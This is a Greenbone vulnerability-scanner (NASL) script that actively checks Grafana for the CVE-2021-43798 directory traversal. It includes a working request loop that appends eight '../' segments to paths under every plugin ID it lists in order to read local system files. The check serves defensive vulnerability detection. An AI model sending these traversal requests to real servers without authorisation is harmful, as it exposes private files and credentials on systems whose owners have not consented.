# Copyright (C) 2021 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:grafana:grafana";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.147264");
  script_version("2021-12-09T04:50:42+0000");
  script_tag(name:"last_modification", value:"2021-12-09 11:40:32 +0000 (Thu, 09 Dec 2021)");
  script_tag(name:"creation_date", value:"2021-12-08 02:13:56 +0000 (Wed, 08 Dec 2021)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");

  script_cve_id("CVE-2021-43798");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Grafana 8.0.0-beta1 - 8.3.0 Directory Traversal Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2021 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_grafana_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("grafana/http/detected");
  script_require_ports("Services/www", 3000);

  script_tag(name:"summary", value:"Grafana is prone to a directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Grafana is vulnerable to directory traversal, allowing access
  to local files. The vulnerable URL path is: <grafana_host_url>/public/plugins/<'plugin-id'> where
  <'plugin-id'> is the plugin ID for any installed plugin.

  Every Grafana instance comes with pre-installed plugins like the Prometheus plugin or MySQL plugin
  so multiple URLs are vulnerable for every instance.");

  script_tag(name:"impact", value:"An unauthenticated attacker may read arbitrary files.");

  script_tag(name:"affected", value:"Grafana version 8.0.0-beta1 through 8.3.0.");

  script_tag(name:"solution", value:"Update to version 8.0.7, 8.1.8, 8.2.7, 8.3.1 or later.");

  script_xref(name:"URL", value:"https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("os_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

plugin_list = make_list("alertGroups",
                        "alertlist",
                        "alertmanager",
                        "annolist",
                        "barchart",
                        "bargauge",
                        "candlestick",
                        "canvas",
                        "cloudwatch",
                        "dashboard",
                        "dashlist",
                        "debug",
                        "elasticsearch",
                        "gauge",
                        "geomap",
                        "gettingstarted",
                        "grafana",
                        "grafana-azure-monitor-datasource",
                        "grafana-clock-panel",
                        "grafana-simple-json-datasource",
                        "graph",
                        "graphite",
                        "heatmap",
                        "histogram",
                        "influxdb",
                        "jaeger",
                        "live",
                        "logs",
                        "loki",
                        "mixed",
                        "mssql",
                        "mysql",
                        "news",
                        "nodeGraph",
                        "opentsdb",
                        "piechart",
                        "pluginlist",
                        "postgres",
                        "prometheus",
                        "stackdriver",
                        "stat",
                        "state-timeline",
                        "status-history",
                        "table",
                        "table-old",
                        "tempo",
                        "testdata",
                        "text",
                        "timeseries",
                        "welcome",
                        "xychart",
                        "zipkin");

files = traversal_files();

foreach pattern (keys(files)) {
  foreach plugin_id (plugin_list) {
    url = dir + "/public/plugins/" + plugin_id + "/" + crap(length: 8 * 3, data: "../") + files[pattern];

    req = http_get(port: port, item: url);
    res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

    if (egrep(pattern: pattern, string: res)) {
      report = 'It was possible to read the file ' + files[pattern] + ' via the URL ' +
               http_report_vuln_url(port: port, url: url, url_only: TRUE) + '\n\nResult:\n\n' + res;
      security_message(port: port, data: report);
      exit(0);
    }
  }
}

exit(0);
